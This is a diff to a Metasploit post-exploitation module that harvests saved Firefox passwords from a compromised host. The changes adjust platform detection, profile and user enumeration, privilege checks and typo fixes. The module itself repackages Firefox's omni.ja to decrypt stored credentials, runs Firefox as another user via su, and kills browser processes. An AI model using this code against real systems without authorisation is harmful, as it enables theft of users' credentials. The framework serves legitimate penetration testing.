@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -16,10 +16,7 @@ require 'zip'
 #
 # Project
 #
-require 'msf/core'
-require 'rex'
 require 'msf/core/auxiliary/report'
-
 
 class MetasploitModule < Msf::Post
   include Msf::Post::File
@@ -59,13 +56,13 @@ class MetasploitModule < Msf::Post
 
     register_options([
       OptBool.new('DECRYPT', [false, 'Decrypts passwords without third party tools', false])
-    ], self.class)
+    ])
 
     register_advanced_options([
       OptInt.new('DOWNLOAD_TIMEOUT', [true, 'Timeout to wait when downloading files through shell sessions', 20]),
       OptBool.new('DISCLAIMER', [false, 'Acknowledge the DECRYPT warning', false]),
       OptBool.new('RECOVER',  [false, 'Attempt to recover from bad DECRYPT when possible', false])
-    ], self.class)
+    ])
   end
 
 
@@ -73,11 +70,11 @@ class MetasploitModule < Msf::Post
     # Certain shells for certain platform
     vprint_status("Determining session platform and type")
     case session.platform
-    when /unix|linux|bsd/
+    when 'unix', 'linux', 'bsd'
       @platform = :unix
-    when /osx/
+    when 'osx'
       @platform = :osx
-    when /win/
+    when 'windows'
       if session.type != "meterpreter"
         print_error "Only meterpreter sessions are supported on Windows hosts"
         return
@@ -146,7 +143,7 @@ class MetasploitModule < Msf::Post
       omnija = read_file(@paths['ff'] + org_file)
       if omnija.nil? or omnija.empty? or omnija =~ /No such file/i
         print_error("Could not download: #{@paths['ff'] + org_file}")
-        print_error("Tip: Try swtiching to a meterpreter shell if possible (as its more reliable/stable when downloading)") if session.type != "meterpreter"
+        print_error("Tip: Try switching to a meterpreter shell if possible (as it's more reliable/stable when downloading)") if session.type != "meterpreter"
         return
       end
 
@@ -174,7 +171,7 @@ class MetasploitModule < Msf::Post
     end
 
     print_status("Uploading #{tmp} to: #{@paths['ff'] + new_file}")
-    print_warning("This may take some time...") if @platform =~ /unix|osx/
+    print_warning("This may take some time...") if [:unix, :osx].include?(@platform)
 
     if session.type == "meterpreter"
       session.fs.file.upload_file(@paths['ff'] + new_file, tmp)
@@ -249,8 +246,8 @@ class MetasploitModule < Msf::Post
 
       if got_root
         vprint_status("Detected ROOT privileges. Searching every account on the target system.")
-        userdirs = cmd_exec("find #{home} -maxdepth 1 -mindepth 1 2>/dev/null").gsub(/\s/, "\n")
-        userdirs << "/root\n"
+        userdirs = "/root\n"
+        userdirs << cmd_exec("find #{home} -maxdepth 1 -mindepth 1 -type d 2>/dev/null")
       else
         vprint_status("Checking #{id}'s Firefox account")
         userdirs = "#{home + id}\n"
@@ -260,16 +257,16 @@ class MetasploitModule < Msf::Post
         dir.chomp!
         next if dir == "." or dir == ".." or dir =~ /No such file/i
 
-        @platform == :osx ? (basepath = "#{dir}/Library/Application\\ Support/Firefox/Profiles/") : (basepath = "#{dir}/.mozilla/firefox/")
+        @platform == :osx ? (basepath = "#{dir}/Library/Application Support/Firefox/Profiles") : (basepath = "#{dir}/.mozilla/firefox")
 
         print_status("Checking for Firefox profile in: #{basepath}")
-        checkpath = cmd_exec("ls #{basepath}").gsub(/\s/, "\n")
+        checkpath = cmd_exec("find " + basepath.gsub(/ /, "\\ ") + " -maxdepth 1 -mindepth 1 -type d 2>/dev/null")
 
         checkpath.each_line do |ffpath|
           ffpath.chomp!
-          if ffpath =~ /\.default/
-            vprint_good("Found profile: #{basepath + ffpath}")
-            paths << "#{basepath + ffpath}"
+          if ffpath =~ /\.default$/
+            vprint_good("Found profile: #{ffpath}")
+            paths << "#{ffpath}"
           end
         end
       end
@@ -332,7 +329,7 @@ class MetasploitModule < Msf::Post
       profile = path.scan(/Profiles[\\|\/](.+)\.(.+)$/).flatten[0].to_s
       profile = path.scan(/firefox[\\|\/](.+)\.(.+)$/).flatten[0].to_s if profile.empty?
 
-      session.type == "meterpreter" ? (files = session.fs.dir.foreach(path)) : (files = cmd_exec("ls #{path} 2>/dev/null").split())
+      session.type == "meterpreter" ? (files = session.fs.dir.foreach(path)) : (files = cmd_exec("find "+ path.gsub(/ /, "\\ ") + " -maxdepth 1 -mindepth 1 -type f 2>/dev/null").gsub(/.*\//, "").split("\n"))
 
       files.each do |file|
         file.chomp!
@@ -367,7 +364,7 @@ class MetasploitModule < Msf::Post
     loot_file = Rex::Text::rand_text_alpha(6) + ".txt"
 
     case @platform
-    when /win/
+    when :windows
       unless got_root || session.sys.config.sysinfo['OS'] =~ /xp/i
         print_warning("You may need SYSTEM privileges on this platform for the DECRYPT option to work")
       end
@@ -379,7 +376,7 @@ class MetasploitModule < Msf::Post
       # This way allows for more independent use of meterpreter payload (32 and 64 bit) and cleaner code
       check_paths << drive + '\\Program Files\\Mozilla Firefox\\'
       check_paths << drive + '\\Program Files (x86)\\Mozilla Firefox\\'
-    when /unix/
+    when :unix
       unless got_root
         print_error("You need ROOT privileges on this platform for DECRYPT option")
         return false
@@ -396,7 +393,7 @@ class MetasploitModule < Msf::Post
       check_paths << '/usr/lib64/firefox/'
       check_paths << '/usr/lib/iceweasel/'
       check_paths << '/usr/lib64/iceweasel/'
-    when /osx/
+    when :osx
       tmpdir = '/tmp/'
       check_paths << '/applications/firefox.app/contents/macos/'
     end
@@ -547,23 +544,30 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
     args = '-purgecaches -chrome chrome://passwordmgr/content/passwordManager.xul'
 
     # In case of unix-like platform Firefox needs to start under user context
-    if @platform =~ /unix/
+    case @platform
+    when :unix
       # Assuming userdir /home/(x) = user
       print_status("Enumerating users")
-      users = cmd_exec("ls /home 2>/dev/null")
-      if users.nil? or users.empty?
+      homedirs = cmd_exec("find /home -maxdepth 1 -mindepth 1 -type d 2>/dev/null").gsub(/.*\//, "")
+      if homedirs.nil? or homedirs.empty?
         print_error("No normal user found")
         return false
       end
-      user = users.split[0]
+      user = nil
+      # Skip home directories which contain a space, as those are likely not usernames...
+      homedirs.each_line do |homedir|
+        user = homedir.chomp
+        break unless user.index(" ")
+      end
+
       # Since we can't access the display environment variable we have to assume the default value
       args.insert(0, "\"#{@paths['ff']}firefox --display=:0 ")
       args << "\""
       cmd = "su #{user} -c"
-    elsif @platform =~ /win|osx/
+    when :windows, :osx
       cmd = @paths['ff'] + "firefox"
       # On OSX, run in background
-      args << "& sleep 5 && killall firefox" if @platform =~ /osx/
+      args << "& sleep 5 && killall firefox" if @platform == :osx
     end
 
     # Check if Firefox is running and kill it
@@ -718,6 +722,10 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
       session.sys.config.getuid =~ /SYSTEM/ ? true : false
     else   # unix, bsd, linux, osx
       id_output = cmd_exec("id").chomp
+      if id_output.blank?
+        # try an absolute path
+        id_output = cmd_exec("/usr/bin/id").chomp
+      end
       id_output.include?("uid=0(") ? true : false
     end
   end
